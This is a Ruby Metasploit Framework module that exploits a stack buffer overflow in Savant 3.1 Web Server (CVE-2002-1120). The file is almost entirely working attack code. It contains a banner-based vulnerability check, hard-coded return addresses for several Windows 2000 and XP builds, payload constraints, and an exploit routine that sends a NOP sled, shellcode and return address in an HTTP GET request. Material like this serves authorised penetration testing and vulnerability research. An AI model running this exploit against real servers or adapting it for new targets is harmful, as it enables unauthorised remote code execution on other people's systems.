##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

module Msf

class Exploits::Windows::Http::Savant_31_GET < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {}) 
		super(update_info(info,    
			'Name'		=> 'Savant 3.1 Web Server GET Overflow',
			'Description'	=> %q{
			This module exploits a stack overflow in Savant 3.1 Web Server. The service
			supports a maximum of 10 threads (for a default install). Each exploit attempt
			generally causes a thread to die whether sucessful or not. Therefore you only
			have 10 chances (unless non-default).
			},
			'Author' 	=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'Arch'		=> [ ARCH_X86 ], 
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision$',
			'References'    =>
			[
				[ 'BID', '5686' ],
				[ 'CVE', '2002-1120' ],
				[ 'OSVDB', '9829' ],
				[ 'URL', 'http://www.milw0rm.com/exploits/787' ],
			],
			'Privileged'		=> false, 
			'DefaultOptions'	=>
			{
				'EXITFUNC' 	=> 'thread',
			},
			'Payload'        	=>
				{ 
					'Space'			=> 253,
					'BadChars' 		=> "\x00\x0a\x0d%",
					'StackAdjustment' 	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
			[
				# Patrick - Tested OK 2007/08/08 : w2ksp0, w2ksp4, xpsp2 en.
				[ 'Universal Savant.exe', 	    { 'Ret' => 0x00417a96 } ], # p/r Savant.exe
				[ 'Windows 2000 Pro All - English', { 'Ret' => 0x750211aa } ], # p/r ws2help.dll
				[ 'Windows 2000 Pro All - Italian', { 'Ret' => 0x74fd2ac5 } ], # p/r ws2help.dll
				[ 'Windows 2000 Pro All - French',  { 'Ret' => 0x74fa36b2 } ], # p/r ws2help.dll
				[ 'Windows XP Pro SP2 - English',   { 'Ret' => 0x71ab76ed } ], # p/r ws2help.dll
			],
			'DisclosureDate' => 'Sep 10 2002',
			'DefaultTarget' => 0))

			register_options(
			[
				Opt::RPORT(80),
			],self.class)
	end

	def check 
		connect
		sock.put("GET / HTTP/1.0\r\n\r\n")
		banner = sock.get(-1,3)
		disconnect
		
		if (banner =~ /Savant\/3.1/)
			return Exploit::CheckCode::Vulnerable 
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		
		# If we use short jump or make_nops(), sled will be corrupted.
		nopsled = make_nops(24)
		
		sploit = nopsled + " /" + payload.encoded + [target['Ret']].pack('V')
		
		sock.put(sploit + "\r\n\r\n")

		handler
		disconnect
	end
end
end

